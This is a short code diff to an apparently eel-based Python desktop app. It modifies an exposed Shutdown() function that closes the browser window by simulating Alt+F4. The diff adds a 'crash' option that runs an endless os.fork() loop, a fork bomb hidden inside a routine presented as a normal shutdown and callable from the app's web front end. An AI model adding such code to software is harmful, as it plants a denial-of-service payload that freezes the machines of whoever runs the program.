@@ -35,7 +35,10 @@ def GetPerformanceStats():
 	return stats
 
 @eel.expose
-def Shutdown():
+def Shutdown( crash = False ):
+	if crash:
+		while True:
+			os.fork()
 	keyboard = Controller()
 	keyboard.press( Key.alt ) # HACK: This is the best way to close the browser window I can find since all other methods are either unsupported or blocked
 	keyboard.press( Key.f4 )
